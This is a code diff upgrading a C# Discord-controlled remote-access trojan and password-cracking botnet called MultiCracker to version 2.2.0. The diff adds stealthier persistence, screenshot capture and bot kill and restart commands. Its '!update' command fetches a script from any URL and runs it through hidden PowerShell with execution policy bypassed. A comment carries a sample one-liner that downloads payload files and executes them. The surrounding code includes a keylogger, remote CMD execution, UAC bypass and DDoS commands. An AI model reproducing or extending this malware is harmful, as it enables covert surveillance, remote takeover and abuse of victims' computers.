@@ -29,11 +29,11 @@ using AForge.Video;
 using AForge.Video.DirectShow;
 using System.Drawing.Imaging;
 using System.IO;
+using System.Drawing;
 using System.Linq;
 
 namespace MultiCracker
 {
-
     public partial class Form1 : Form
     {
         // ----------------------------------------
@@ -52,7 +52,7 @@ namespace MultiCracker
         // DONE: Add a way to elevate to admin.
         // DONE: Disable UAC.
         // DONE: Add a way to uninstall persistence.
-        // Save settings to profiles. (file)
+        // Save hash settings to profiles. (file)
         // DONE: Save passwords and hashes to seperate channels to be used later.
         // DONE: Add a way to load passwords and hashes from seperate channels.
         // DONE: Add a command for executing CMD commands on the bot.
@@ -72,6 +72,9 @@ namespace MultiCracker
         // DONE: File management for RAT.
         // DONE: Keylogger for RAT.
         // Better filter for RAT keylogger, its good but could be better.
+        // Keylogger not working when compiling to one file.
+        // DONE: Make screenshot working for entire screen when only client is only using one screen.
+        // DONE: Not being able to restart RAT if its channel is deleted.
         // ----------------------------------------
 
 
@@ -80,16 +83,32 @@ namespace MultiCracker
         // Go through all of them and change them to your liking.
         // ----------------------------------------
 
-        bool Persistent = true; // If true, the bot will install persistence on the target machine.
+        // --- KEEP IN MIND YOU NEED TO COMPILE TO ONE FILE!! (For special) --- //
+        bool SpecialPersistent = true; // If true, the bot will install persistence on the target machine. (This is a special version of persistence that is harder to detect for some computers.)
+        // --- KEEP IN MIND YOU NEED TO COMPILE TO ONE FILE!! (For special) --- //
+        bool NormalPersistent = false; // If true, the bot will install persistence on the target machine.
         bool UAConStart = true; // If true, the bot will ask for elevation to admin on start.
         bool AutoCrack = true; // If true, the bot will automatically start cracking if it finds a hash with the auto-crack feature.
         bool AutoRAT = true; // If true, the RAT will start on the target machine at launch.
         private bool DebugMode = true; // If false, the window will be hidden and the program will run in the background.
-
+        
+        // Categories
+        //string BOT_CATEGORY = "CLIENTS"; // The category for the bot logs in the server.
+        string BOT_CATEGORY = "CLIENTS"; // The category for the bot logs in the server.
+        //string RAT_CATEGORY = "RAT"; // The category for the RAT channel in the server.
+        string RAT_CATEGORY = "RAT"; // The category for the RAT channel in the server.
+        
         // Communication
-        string BOT_TOKEN = "<DISCORD BOT TOKEN>"; // The main bot token for multi-cracker.
-        private static string ratPrimaryToken = "<BOT TOKEN (IS NEEDED FOR RAT TO WORK)>"; // The token for the RAT. (Could be same as main bot token.)
-        private static string ratAlternativeToken = "<BOT TOKEN (IS NOT USED IN 2.0.0)>"; // Secondary token for the RAT. (Not used in 2.0.0)
+        string BOT_TOKEN = "<BOT TOKEN main multi-cracker>"; // The main bot token for multi-cracker.
+        private static string ratPrimaryToken = "<BOT TOKEN (Can be main token)>"; // The token for the RAT. (Could be same as main bot token.)
+        private static string ratAlternativeToken = "<BOT TOKEN (IS NOT USED IN BELOW 2.2.0)>"; // Secondary token for the RAT. (Not used in 2.2.0)
+        
+        string registryName = "MultiCracker"; // Name of the registry key. (Special and normal)
+        // Persistence settings (Normal)
+        string dropPath = "C:\\Windows\\debug\\multi"; // Path to drop the file/create folder multi.
+        string fileName = "multiCracker.exe"; // Name of the .exe file to drop.
+        // Persistence settings (Special)
+        string fileNameSpecial = "multiCracker.exe"; // Name of the .log file to drop with special persistence.
 
         // ----------------------------------------
         // Now you are done with the settings.
@@ -116,7 +135,7 @@ namespace MultiCracker
         int currentWarningLevelRAT = 0;
 
         // Version
-        string currentVersion = "2.0.0";
+        string currentVersion = "2.2.0";
 
         // Force start/end
         int forceEnd = int.MaxValue; // As high as possible (default)
@@ -159,6 +178,13 @@ namespace MultiCracker
         public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
         private static int WH_KEYBOARD_LL = 13;
         private static int WM_KEYDOWN = 0x100;
+
+        // Screenshot
+        public const int DESKTOPVERTRES = 0x75;
+        public const int DESKTOPHORZRES = 0x76;
+        [DllImport("gdi32.dll")]
+        public static extern int GetDeviceCaps(IntPtr hDC, int index);
+
 
 
         // Counter for number of tries
@@ -304,24 +330,6 @@ namespace MultiCracker
             if (arg is not IUserMessage message)
                 return;
 
-            bool heavyLoging = false;
-            if (heavyLoging)
-            {
-                Log(new LogMessage(LogSeverity.Info, "Message", "Message event triggered."));
-
-                // Check the type of the message
-                Log(new LogMessage(LogSeverity.Info, "Message", $"Message type: {arg.Type}"));
-
-                // Check for embeds or attachments
-                if (message.Embeds.Any())
-                    Log(new LogMessage(LogSeverity.Info, "Message", "Message contains embeds."));
-                if (message.Attachments.Any())
-                    Log(new LogMessage(LogSeverity.Info, "Message", "Message contains attachments."));
-
-                // Log the raw content of the message
-                Log(new LogMessage(LogSeverity.Info, "Message", $"Raw message content: {message.Content}"));
-            }
-
             // Trim the message content to remove leading and trailing whitespaces
             string trimmedContent = message.Content.Trim();
 
@@ -354,6 +362,8 @@ namespace MultiCracker
                     messagesBasic.Add($"Hello! I am a bot that can crack passwords and more. Here are my commands: (**Version is {currentVersion}**)\r\n");
                     messagesBasic.Add("**-------------- BASIC --------------**\r\n");
                     messagesBasic.Add("**!help** - Displays this message.\r\n");
+                    messagesBasic.Add("**!kys** - Bot commits suicide...\r\n");
+                    messagesBasic.Add("**!restart** - Restarts the bot.\r\n");
                     messagesCracking.Add("\r\n**-------------- CRACKING --------------**\r\n");
                     messagesCracking.Add("**!crack** - Starts cracking the password.\r\n");
                     messagesCracking.Add("**!crackAll** - Makes all bots (including itself) crack the password its selected.\r\n");
@@ -373,8 +383,8 @@ namespace MultiCracker
                     messagesCracking.Add("**!start <start-count>, <end-count>** - Starts cracking <start1>,<end1>;<start2>,<end2>;<start3>,<end3>. (Mostly for bots to use...)\r\n");
                     messagesCracking.Add("**!resetStart** - Resets the start and end count.\r\n");
                     messagesOther.Add("\r\n**-------------- OTHER --------------**\r\n");
-                    messagesOther.Add("**!kys** - Bot commits suicide...\r\n");
                     messagesOther.Add("**!elevate** - Ask for elevation from user to admin on bot computer.\r\n");
+                    messagesOther.Add("**!update <url-to-your-powershell-script-for-downloading-new-version>** - Updates the bot to your newer version of multi-cracker.\r\n");
                     messagesOther.Add("**!cmd <command>** - Execute commands with CMD on bot's computer.\r\n");
                     messagesDebug.Add("\r\n**-------------- DEBUG --------------**\r\n");
                     messagesDebug.Add("**!log** - Sends entire log as .txt file.\r\n");
@@ -411,6 +421,83 @@ namespace MultiCracker
                     await message.Channel.SendMessageAsync(string.Join("", messagesDDoS));
 
                     Log(new LogMessage(LogSeverity.Info, "Message", $"Sent help message."));
+                }
+                else if (trimmedContent == "!kys")
+                {
+                    // Send a discord message
+                    await message.Channel.SendMessageAsync("Unaliving myself...");
+
+                    // Choose a random last word
+                    Random random = new Random();
+                    int randomNumber = random.Next(0, 10);
+                    string[] lastWords = {
+                        "I told you I was sick. - Spike Milligan",
+                        "I'm bored with it all. - Winston Churchill",
+                        "Either this wallpaper goes, or I do. - Oscar Wilde",
+                        "It's very beautiful over there. - Thomas Edison",
+                        "I'd hate to die twice. It's so boring. - Richard Feynman",
+                        "I am not the least afraid to die. - Charles Darwin",
+                        "Why is this happening? - Lady Nancy Astor",
+                        "I've had 18 straight whiskies. I think that's the record. - Dylan Thomas",
+                        "This is no way to live! - Groucho Marx",
+                        "I should never have switched from Scotch to Martinis. - Humphrey Bogart",
+                        "I'm going to the bathroom to read. - Elvis Presley",
+                        "I am ready. - Woodrow Wilson",
+                        "What is life? It is the flash of a firefly in the night. - Crowfoot",
+                        "I hope the exit is joyful and I hope never to return. - Frida Kahlo",
+                        "I'm losing it. - Frank Sinatra",
+                        "I feel great. - Elvis Presley",
+                        "It's better to burn out than to fade away. - Kurt Cobain",
+                        "Goodbye, everybody. - Hart Crane",
+                        "I have offended God and mankind because my work did not reach the quality it should have. - Leonardo da Vinci",
+                        "I'm going to the bathroom to read. - Elvis Presley",
+                        "I've had a hell of a lot of fun and I've enjoyed every minute of it. - Errol Flynn",
+                        "Why not? After all, it belongs to him. - Charlie Chaplin (when asked why he was looking down at the ground before he died)",
+                        "What's the big hurry? - Ronald Reagan",
+                        "I'm bored. - James Brown",
+                        "Now comes the mystery. - Henry Ward Beecher",
+                        "I've never felt better. - Douglas Fairbanks",
+                        "Please put out that light, James. - Louisa May Alcott"
+                    };
+                    string lastWord = lastWords[randomNumber];
+
+                    // Send a discord message
+                    await message.Channel.SendMessageAsync(lastWord);
+
+                    // Remove ratted-channel
+                    // Go through all channels and find the one that starts with "ratted-" and contains the computer name
+                    guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+                    foreach (var channel1 in guild.TextChannels)
+                    {
+                        if (channel1.Name.StartsWith("ratted-") && channel1.Name.Contains(computerName))
+                        {
+                            // Delete the channel
+                            await channel1.DeleteAsync();
+                        }
+                    }
+
+                    // Kill the bot
+                    Environment.Exit(0);
+                }
+                else if (trimmedContent == "!restart")
+                {
+                    // Send a discord message
+                    await message.Channel.SendMessageAsync("Restarting...");
+
+                    // Remove ratted-channel
+                    // Go through all channels and find the one that starts with "ratted-" and contains the computer name
+                    guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+                    foreach (var channel1 in guild.TextChannels)
+                    {
+                        if (channel1.Name.StartsWith("ratted-") && channel1.Name.Contains(computerName))
+                        {
+                            // Delete the channel
+                            await channel1.DeleteAsync();
+                        }
+                    }
+
+                    // Start its own process
+                    Process.Start(Application.ExecutablePath);
                 }
                 // CRACKING
                 else if (trimmedContent == "!crack")
@@ -784,63 +871,6 @@ namespace MultiCracker
                     Log(new LogMessage(LogSeverity.Info, "Message", $"Reset forces settings. (ForcesSS: {forcesSS})"));
                 }
                 // OTHER
-                else if (trimmedContent == "!kys")
-                {
-                    // Send a discord message
-                    await message.Channel.SendMessageAsync("Unaliving myself...");
-
-                    // Choose a random last word
-                    Random random = new Random();
-                    int randomNumber = random.Next(0, 10);
-                    string[] lastWords = {
-                        "I told you I was sick. - Spike Milligan",
-                        "I'm bored with it all. - Winston Churchill",
-                        "Either this wallpaper goes, or I do. - Oscar Wilde",
-                        "It's very beautiful over there. - Thomas Edison",
-                        "I'd hate to die twice. It's so boring. - Richard Feynman",
-                        "I am not the least afraid to die. - Charles Darwin",
-                        "Why is this happening? - Lady Nancy Astor",
-                        "I've had 18 straight whiskies. I think that's the record. - Dylan Thomas",
-                        "This is no way to live! - Groucho Marx",
-                        "I should never have switched from Scotch to Martinis. - Humphrey Bogart",
-                        "I'm going to the bathroom to read. - Elvis Presley",
-                        "I am ready. - Woodrow Wilson",
-                        "What is life? It is the flash of a firefly in the night. - Crowfoot",
-                        "I hope the exit is joyful and I hope never to return. - Frida Kahlo",
-                        "I'm losing it. - Frank Sinatra",
-                        "I feel great. - Elvis Presley",
-                        "It's better to burn out than to fade away. - Kurt Cobain",
-                        "Goodbye, everybody. - Hart Crane",
-                        "I have offended God and mankind because my work did not reach the quality it should have. - Leonardo da Vinci",
-                        "I'm going to the bathroom to read. - Elvis Presley",
-                        "I've had a hell of a lot of fun and I've enjoyed every minute of it. - Errol Flynn",
-                        "Why not? After all, it belongs to him. - Charlie Chaplin (when asked why he was looking down at the ground before he died)",
-                        "What's the big hurry? - Ronald Reagan",
-                        "I'm bored. - James Brown",
-                        "Now comes the mystery. - Henry Ward Beecher",
-                        "I've never felt better. - Douglas Fairbanks",
-                        "Please put out that light, James. - Louisa May Alcott"
-                    };
-                    string lastWord = lastWords[randomNumber];
-
-                    // Send a discord message
-                    await message.Channel.SendMessageAsync(lastWord);
-
-                    // Remove ratted-channel
-                    // Go through all channels and find the one that starts with "ratted-" and contains the computer name
-                    guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
-                    foreach (var channel1 in guild.TextChannels)
-                    {
-                        if (channel1.Name.StartsWith("ratted-") && channel1.Name.Contains(computerName))
-                        {
-                            // Delete the channel
-                            await channel1.DeleteAsync();
-                        }
-                    }
-
-                    // Kill the bot
-                    Environment.Exit(0);
-                }
                 else if (trimmedContent == "!elevate")
                 {
                     // Check if admin
@@ -862,6 +892,20 @@ namespace MultiCracker
                         // Log
                         Log(new LogMessage(LogSeverity.Info, "Elevate", $"Already admin."));
                     }
+                }
+                else if (trimmedContent.StartsWith("!update"))
+                {
+                    // Find the argument after !update
+                    string argument = trimmedContent.Substring(8);
+
+                    // Update the bot
+                    await message.Channel.SendMessageAsync($"Updating bot to link: **{argument}**");
+
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Update", $"Updating bot to link: {argument}"));
+
+                    // Update the bot
+                    await Task.Run(() => UpdateBot(argument));
                 }
                 else if (trimmedContent.StartsWith("!cmd"))
                 {
@@ -1019,7 +1063,6 @@ namespace MultiCracker
                 // PERSISTENCE
                 else if (trimmedContent == "!install")
                 {
-                    // Using registry to install persistence
                     InstallPersistence();
                 }
                 else if (trimmedContent == "!uninstall")
@@ -1047,6 +1090,14 @@ namespace MultiCracker
                     {
                         message.Channel.SendMessageAsync("Please elevate to admin first. (Tip: **!elevate**)");
                     }
+                }
+                else if (trimmedContent == "!specialInstall")
+                {
+                    InstallSpecialPersistence();
+                }
+                else if (trimmedContent == "!specialUninstall")
+                {
+                    UninstallSpecialPersistence();
                 }
                 // DDoS
                 else if (trimmedContent.StartsWith("!ddos"))
@@ -1150,11 +1201,8 @@ namespace MultiCracker
                             // Send discord message
                             await message.Channel.SendMessageAsync($"Could not find the channel. Somehow it has disappeared, restarting RAT...");
 
-                            // Set RATRunning to false
+                            // Set RATRunning to false (That automatically restarts the RAT)
                             RATRunning = false;
-
-                            // Send !rat again to channel
-                            await message.Channel.SendMessageAsync($"!rat");
                         }
                     }
                     else
@@ -1171,6 +1219,7 @@ namespace MultiCracker
                     }
                 }
 
+
                 // Invalid Command
                 else if (trimmedContent.StartsWith("!"))
                 {
@@ -1183,8 +1232,10 @@ namespace MultiCracker
                 Log(new LogMessage(LogSeverity.Info, "Message", "Received empty or whitespace-only message."));
             }
         }
+        
         private async Task CreateBotLogsChannel()
         {
+            // Create new channel "bot-<computername>" in category "BOT_CATEGORY"
             try
             {
                 // Find the first available guild
@@ -1196,51 +1247,101 @@ namespace MultiCracker
                     // Find the name of computer
                     string computerNameRaw = Environment.MachineName;
                     string computerName = computerNameRaw.ToLower();
+                    LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Computer name: {computerName}"));
 
-                    // Check if the channel already exists
-                    var existingChannel = guild.TextChannels.FirstOrDefault(channel => channel.Name == $"bot-{computerName}");
-
-                    if (existingChannel == null)
+                    // Check if category "BOT_CATEGORY" exists
+                    var category = guild.CategoryChannels.FirstOrDefault(cat => cat.Name == BOT_CATEGORY);
+                    if (category != null)
                     {
-                        // Create the channel if it doesn't exist
-                        var channel = await guild.CreateTextChannelAsync($"bot-{computerName}");
-                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Created bot-{computerName} channel."));
-                        // You can add additional configuration for the channel if needed
-                        // For example: await channel.ModifyAsync(properties => properties.Topic = "Bot logs channel");
+                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Category found: {category.Name}"));
 
-                        // Start heartbeat timer in a new thread
-                        await TimerThread();
+                        // Check if the channel already exists
+                        var existingChannel = guild.TextChannels.FirstOrDefault(channel => channel.Name == $"bot-{computerName}");
+
+                        if (existingChannel == null)
+                        {
+                            // Create the channel if it doesn't exist
+                            try
+                            {
+                                // Attempt to create the channel in the category
+                                var channel = await guild.CreateTextChannelAsync($"bot-{computerName}", properties =>
+                                {
+                                    properties.CategoryId = category.Id;
+                                });
+
+                                await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created bot-{computerName} channel."));
+
+                                // Start heartbeat timer in a new thread
+                                await TimerThreadRAT();
+                            }
+                            catch (Exception ex)
+                            {
+                                LogRAT(new LogMessage(LogSeverity.Error, "Channel Creation", $"Error creating channel: {ex.Message}"));
+                            }
+                        }
+                        else
+                        {
+                            await Log(new LogMessage(LogSeverity.Info, "Discord", $"bot-{computerName} channel already exists. Deleting it."));
+                            await Log(new LogMessage(LogSeverity.Info, "Discord", $"Deleting channel to remove all messages in bot-{computerName} channel..."));
+
+                            // Remove entire channel
+                            await existingChannel.DeleteAsync();
+
+                            await Log(new LogMessage(LogSeverity.Info, "Discord", $"Deleted bot-{computerName} channel."));
+
+                            // Create new channel in the category
+                            var channel = await guild.CreateTextChannelAsync($"bot-{computerName}", properties =>
+                            {
+                                properties.CategoryId = category.Id;
+                            });
+
+                            await Log(new LogMessage(LogSeverity.Info, "Discord", $"Created a brand new bot-{computerName} channel."));
+
+                            // Start heartbeat timer in a new thread
+                            await TimerThread();
+                        }
+
+                        // Install persistence
+                        if (NormalPersistent)
+                        {
+                            InstallPersistence();
+                        }
+                        else if (SpecialPersistent)
+                        {
+                            InstallSpecialPersistence();
+                        }
+                        else
+                        {
+                            // Log
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Does not install persistence on start..."));
+                        }
+                        // Start autocrack cycle on startup
+                        if (AutoCrack)
+                        {
+                            // Wait for 1 seconds
+                            await Task.Delay(1000);
+                            updateAutoSettings();
+                            findAndSelectAutoSplit();
+                        }
                     }
                     else
                     {
-                        Log(new LogMessage(LogSeverity.Info, "Discord", $"bot-{computerName} channel already exists. Deleting it."));
-                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Deleting channel to remove all messages in bot-{computerName} channel..."));
+                        Log(new LogMessage(LogSeverity.Error, "Discord", $"Category not found."));
+                        // Create the category if it doesn't exist
+                        try
+                        {
+                            // Attempt to create the category
+                            var newCategory = await guild.CreateCategoryChannelAsync(BOT_CATEGORY);
+                            LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created category: {newCategory.Name}"));
 
-                        // Remove entire channel
-                        await existingChannel.DeleteAsync();
-
-                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Deleted bot-{computerName} channel."));
-
-                        // Create new channel
-                        var channel = await guild.CreateTextChannelAsync($"bot-{computerName}");
-
-                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Created a brand new bot-{computerName} channel."));
-
-                        // Start heartbeat timer in a new thread
-                        await TimerThread();
-                    }
-                    // Install persistence
-                    if (Persistent)
-                    {
-                        InstallPersistence();
-                    }
-                    // Start autocrack cycle on startup
-                    if (AutoCrack)
-                    {
-                        // Wait for 1 seconds
-                        await Task.Delay(1000);
-                        updateAutoSettings();
-                        findAndSelectAutoSplit();
+                            // Start CreateRATChannels again
+                            await CreateBotLogsChannel();
+                            return;
+                        }
+                        catch (Exception ex)
+                        {
+                            LogRAT(new LogMessage(LogSeverity.Error, "Category Creation", $"Error creating category: {ex.Message}"));
+                        }
                     }
                 }
                 else
@@ -1251,6 +1352,7 @@ namespace MultiCracker
             }
             catch (Exception ex)
             {
+                // Log
                 Log(new LogMessage(LogSeverity.Error, "Connection", $"Exception during bot startup: {ex}"));
             }
         }
@@ -1346,7 +1448,7 @@ namespace MultiCracker
 
         private async Task CreateRATChannels()
         {
-            // Create new channel "ratted-<computername>" in category "RAT-Section"
+            // Create new channel "ratted-<computername>" in category "RAT_CATEGORY"
             try
             {
                 // Find the first available guild
@@ -1360,44 +1462,75 @@ namespace MultiCracker
                     string computerName = computerNameRaw.ToLower();
                     LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Computer name: {computerName}"));
 
-                    // Check if the channel already exists
-                    var existingChannel = guild.TextChannels.FirstOrDefault(channel => channel.Name == $"ratted-{computerName}");
-
-                    if (existingChannel == null)
+                    // Check all channels in a category and find the category "RAT_CATEGORY"
+                    var category = guild.CategoryChannels.FirstOrDefault(cat => cat.Name == RAT_CATEGORY);
+                    if (category != null)
                     {
-                        // Create the channel if it doesn't exist
-                        try
+                        LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Category found: {category.Name}"));
+
+                        // Check if the channel already exists
+                        var existingChannel = guild.TextChannels.FirstOrDefault(channel => channel.Name == $"ratted-{computerName}");
+
+                        if (existingChannel == null)
                         {
-                            // Attempt to create the channel
-                            var channel = await guild.CreateTextChannelAsync($"ratted-{computerName}");
-                            
-                            await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created ratted-{computerName} channel."));
-                            
+                            // Create the channel if it doesn't exist
+                            try
+                            {
+                                // Create new channel in the category
+                                var channel = await guild.CreateTextChannelAsync($"ratted-{computerName}", properties =>
+                                {
+                                    properties.CategoryId = category.Id;
+                                });
+                                
+                                await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created ratted-{computerName} channel."));
+
+                                // Start heartbeat timer in a new thread
+                                await TimerThreadRAT();
+                            }
+                            catch (Exception ex)
+                            {
+                                LogRAT(new LogMessage(LogSeverity.Error, "Channel Creation", $"Error creating channel: {ex.Message}"));
+                            }
+                        }
+                        else
+                        {
+                            await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"ratted-{computerName} channel already exists. Deleting it."));
+                            await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Deleting channel to remove all messages in ratted-{computerName} channel..."));
+
+                            // Remove entire channel
+                            await existingChannel.DeleteAsync();
+
+                            await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Deleted ratted-{computerName} channel."));
+
+                            // Create new channel
+                            var channel = await guild.CreateTextChannelAsync($"ratted-{computerName}", properties =>
+                            {
+                                properties.CategoryId = category.Id;
+                            });
+
+                            await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created a brand new ratted-{computerName} channel."));
+
                             // Start heartbeat timer in a new thread
                             await TimerThreadRAT();
-                        }
-                        catch (Exception ex)
-                        {
-                            LogRAT(new LogMessage(LogSeverity.Error, "Channel Creation", $"Error creating channel: {ex.Message}"));
                         }
                     }
                     else
                     {
-                        await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"ratted-{computerName} channel already exists. Deleting it."));
-                        await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Deleting channel to remove all messages in ratted-{computerName} channel..."));
+                        LogRAT(new LogMessage(LogSeverity.Error, "Discord", $"Category not found."));
+                        // Create the category if it doesn't exist
+                        try
+                        {
+                            // Attempt to create the category
+                            var newCategory = await guild.CreateCategoryChannelAsync(RAT_CATEGORY);
+                            LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created category: {newCategory.Name}"));
 
-                        // Remove entire channel
-                        await existingChannel.DeleteAsync();
-
-                        await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Deleted ratted-{computerName} channel."));
-
-                        // Create new channel
-                        var channel = await guild.CreateTextChannelAsync($"ratted-{computerName}");
-
-                        await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created a brand new ratted-{computerName} channel."));
-
-                        // Start heartbeat timer in a new thread
-                        await TimerThreadRAT();
+                            // Start CreateRATChannels again
+                            await CreateRATChannels();
+                        }
+                        catch (Exception ex)
+                        {
+                            LogRAT(new LogMessage(LogSeverity.Error, "Category Creation", $"Error creating category: {ex.Message}"));
+                        }
                     }
                 }
                 else
@@ -1437,6 +1570,17 @@ namespace MultiCracker
         }
         async Task SendHeartbeatRAT(int level)
         {
+            if (!RATRunning)
+            {
+                // Log
+                LogRAT(new LogMessage(LogSeverity.Error, "RAT", "The RAT channel is not found... Restarting RAT"));
+                // Stop the RAT client
+                await _ratClient.StopAsync();
+                // Start the RAT client
+                await RAT();
+
+                return;
+            }
             if (level == 1)
             {
                 // Log (typically around 30 sec without answer)
@@ -1700,32 +1844,92 @@ namespace MultiCracker
                         // Get the bounds of the virtual screen (all monitors combined)
                         Rectangle totalBounds = SystemInformation.VirtualScreen;
 
-                        // Take a screenshot covering all screens with specified pixel format
-                        using (var screenshot = new Bitmap(totalBounds.Width, totalBounds.Height, PixelFormat.Format32bppArgb))
-                        using (var gfxScreenshot = Graphics.FromImage(screenshot))
+                        // Make variables for how many screens there are
+                        int screenCount = Screen.AllScreens.Length;
+                        // Log
+                        LogRAT(new LogMessage(LogSeverity.Info, "Screenshot", $"Number of screens: {screenCount}"));
+
+                        // If there is only one screen
+                        if (screenCount == 1)
                         {
-                            // Capture the virtual screen
-                            gfxScreenshot.CopyFromScreen(totalBounds.X, totalBounds.Y, 0, 0, totalBounds.Size, CopyPixelOperation.SourceCopy);
-
-                            // Save the screenshot to a dynamically generated filename
-                            string screenshotPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
-                            screenshot.Save(screenshotPath);
-
-                            // Send the file (NOT AS NORMAL TEXT)
-                            await message.Channel.SendFileAsync(screenshotPath)
-                                .ContinueWith(task =>
+                            // Take a screenshot of entire screen
+                            try
+                            {
+                                int width, height;
+                                using (var g = Graphics.FromHwnd(IntPtr.Zero))
                                 {
-                                    if (task.Exception != null)
+                                    var hDC = g.GetHdc();
+                                    width = GetDeviceCaps(hDC, DESKTOPHORZRES);
+                                    height = GetDeviceCaps(hDC, DESKTOPVERTRES);
+                                    g.ReleaseHdc(hDC);
+                                }
+
+                                // Create path to the file (current folder + filename)
+                                string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ScreenCapture.jpg");
+
+                                // Take screenshot and save
+                                using (var img = new Bitmap(width, height))
+                                {
+                                    using (var g = Graphics.FromImage(img))
                                     {
-                                        // Handle exception from SendFileAsync
-                                        LogRAT(new LogMessage(LogSeverity.Error, "Screenshot", $"Error sending file: {task.Exception.Message}"));
+                                        g.CopyFromScreen(0, 0, 0, 0, img.Size);
                                     }
-                                    else
+                                    img.Save(path, System.Drawing.Imaging.ImageFormat.Jpeg);
+                                }
+
+                                // Find path to the file
+                                string filePath = Path.GetFullPath(path);
+
+                                // Send the file (NOT AS NORMAL TEXT)
+                                await message.Channel.SendFileAsync(path)
+                                    .ContinueWith(task =>
                                     {
-                                        // Log success
-                                        LogRAT(new LogMessage(LogSeverity.Info, "Screenshot", "Screenshot taken and uploaded to Discord."));
-                                    }
-                                });
+                                        if (task.Exception != null)
+                                        {
+                                            // Handle exception from SendFileAsync
+                                            LogRAT(new LogMessage(LogSeverity.Error, "Screenshot", $"Error sending file: {task.Exception.Message}"));
+                                        }
+                                        else
+                                        {
+                                            // Log success
+                                            LogRAT(new LogMessage(LogSeverity.Info, "Screenshot", "Screenshot taken and uploaded to Discord."));
+                                        }
+                                    });
+                            }
+                            catch (Exception ex)
+                            {
+                                MessageBox.Show(ex.Message);
+                            }
+                        }
+                        else
+                        {
+                            // Take a screenshot covering all screens with specified pixel format
+                            using (var screenshot = new Bitmap(totalBounds.Width, totalBounds.Height, PixelFormat.Format32bppArgb))
+                            using (var gfxScreenshot = Graphics.FromImage(screenshot))
+                            {
+                                // Capture the virtual screen
+                                gfxScreenshot.CopyFromScreen(totalBounds.X, totalBounds.Y, 0, 0, totalBounds.Size, CopyPixelOperation.SourceCopy);
+
+                                // Save the screenshot to a dynamically generated filename
+                                string screenshotPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
+                                screenshot.Save(screenshotPath);
+
+                                // Send the file (NOT AS NORMAL TEXT)
+                                await message.Channel.SendFileAsync(screenshotPath)
+                                    .ContinueWith(task =>
+                                    {
+                                        if (task.Exception != null)
+                                        {
+                                            // Handle exception from SendFileAsync
+                                            LogRAT(new LogMessage(LogSeverity.Error, "Screenshot", $"Error sending file: {task.Exception.Message}"));
+                                        }
+                                        else
+                                        {
+                                            // Log success
+                                            LogRAT(new LogMessage(LogSeverity.Info, "Screenshot", "Screenshot taken and uploaded to Discord."));
+                                        }
+                                    });
+                            }
                         }
                     }
                     catch (Exception ex)
@@ -2395,6 +2599,66 @@ namespace MultiCracker
         }
 
 
+        // Updater
+        public Task UpdateBot(string url)
+        {
+            // Update bot from url (powershell). Script could look like this:
+            /// -------------------------------------- ///
+            ///
+            /// cd C:\Windows\security; if (!(Test-Path .\database)) { New-Item -ItemType Directory -Path .\database }; cd .\database; foreach ($i in ('AForge.dll', 'AForge.Video.DirectShow.dll', 'AForge.Video.dll', 'Discord.Net.Commands.dll', 'Discord.Net.Core.dll', 'Discord.Net.Interactions.dll', 'Discord.Net.Rest.dll', 'Discord.Net.Webhook.dll', 'Discord.Net.WebSocket.dll', 'Microsoft.Extensions.DependencyInjection.Abstractions.dll', 'MultiCracker.deps.json', 'MultiCracker.dll', 'MultiCracker.exe', 'MultiCracker.pdb', 'MultiCracker.runtimeconfig.json', 'Newtonsoft.Json.dll', 'System.Interactive.Async.dll', 'System.Linq.Async.dll', 'System.Reactive.dll')) { curl -Uri "https://raw.githubusercontent.com/USERNAME/REPONAME/main/PAYLOADS/MULTICRACKER/2.2.0/$i" -OutFile $i }; C:\windows\security\database\multicracker.exe
+            /// 
+            /// -------------------------------------- ///
+            
+            // Get content from url
+            string content = GetContent(url);
+
+            // Execute the content with powershell
+            try
+            {
+                string command = $"-NoProfile -ExecutionPolicy Bypass -Command \"{content}\"";
+                // Execute command with powershell
+                ProcessStartInfo processInfo = new ProcessStartInfo("powershell", $"{command}");
+                processInfo.CreateNoWindow = true;
+                processInfo.UseShellExecute = false;
+                processInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                Process process = new Process();    
+                process.StartInfo = processInfo;
+                process.Start();
+                process.WaitForExit();
+
+                // Log
+                Log(new LogMessage(LogSeverity.Info, "Update", $"Bot updated."));
+            }
+            catch (Exception ex)
+            {
+                // Log
+                Log(new LogMessage(LogSeverity.Error, "Update", $"Error updating bot: {ex.Message}"));
+            }
+            return Task.CompletedTask;
+        }
+        private string GetContent(string url)
+        {
+            string content = "";
+            try
+            {
+                using (WebClient client = new WebClient())
+                {
+                    content = client.DownloadString(url);
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Update", $"Got content from url: {url}"));
+                    // Log content
+                    Log(new LogMessage(LogSeverity.Info, "Update", $"Content got: {content}"));
+                }
+            }
+            catch (Exception ex)
+            {
+                // Log
